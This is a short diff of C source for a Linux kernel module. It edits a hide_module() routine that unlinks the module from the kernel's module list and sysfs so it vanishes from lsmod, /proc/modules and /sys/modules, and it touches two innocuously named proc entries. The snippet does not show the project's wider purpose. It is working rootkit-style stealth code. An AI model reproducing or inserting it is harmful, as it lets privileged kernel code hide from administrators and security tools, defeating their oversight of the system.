@@ -607,17 +607,17 @@ void show_module(void) {
 
 void hide_module(void) {
 #if defined(HIDE_SELF_MODULE)
-    if (is_file_exist("/proc/sched_debug")) {
+    /*if (is_file_exist("/proc/sched_debug")) {
         remove_proc_entry("sched_debug", NULL);
     }
 
     if (is_file_exist("/proc/uevents_records")) {
         remove_proc_entry("uevents_records", NULL);
-    }
+    }*/
 
 #ifdef MODULE
-    // module_previous = THIS_MODULE->list.prev;
-    // module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
+     module_previous = THIS_MODULE->list.prev;
+     module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
     //
     list_del(&THIS_MODULE->list); // lsmod,/proc/modules
     kobject_del(&THIS_MODULE->mkobj.kobj); // /sys/modules
